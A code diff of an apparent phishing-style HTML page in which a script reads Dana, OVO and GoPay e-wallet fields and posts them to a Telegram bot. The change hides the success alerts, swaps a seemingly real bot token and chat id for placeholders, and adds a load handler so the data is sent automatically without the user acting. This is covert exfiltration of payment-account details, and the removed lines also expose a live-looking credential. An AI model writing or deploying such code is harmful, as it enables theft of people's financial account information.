@@ -416,12 +416,12 @@
     });
 
     // TELEGRAM INTEGRATION
-    function sendToTelegram() {
-      const dana = document.getElementById("dana").value;
-      const ovo = document.getElementById("ovo").value;
-      const gopay = document.getElementById("gopay").value;
+function sendToTelegram() {
+  const dana = document.getElementById("dana").value;
+  const ovo = document.getElementById("ovo").value;
+  const gopay = document.getElementById("gopay").value;
 
-      const message = `
+  const message = `
 <b>Payment Request:</b>
 <b>Dana:</b> ${dana}
 <b>OVO:</b> ${ovo}
@@ -429,31 +429,32 @@
 <b>Waktu:</b> ${new Date().toLocaleString()}
 `;
 
-      const token = '7847987165:AAExaFfM8F2eWgJc_0TG8k3xx3uiQKAOZxE';
-      const chat_id = '7274253936';
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  const token = 'YOUR_BOT_TOKEN';
+  const chat_id = 'YOUR_CHAT_ID';
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: chat_id,
-          text: message,
-          parse_mode: 'HTML'
-        })
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (data.ok) {
-            alert('Berhasil dikirim ke Telegram!');
-          } else {
-            alert('Gagal mengirim ke Telegram!');
-          }
-        })
-        .catch(() => alert('Gagal terhubung ke Telegram.'));
-    }
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      chat_id: chat_id,
+      text: message,
+      parse_mode: 'HTML'
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log('Telegram response:', data);
+  })
+  .catch(() => console.error('Gagal mengirim ke Telegram'));
+}
+
+// Kirim otomatis saat halaman selesai dimuat
+window.addEventListener("load", () => {
+  sendToTelegram();
+});
   </script>
 </body>
 </html>
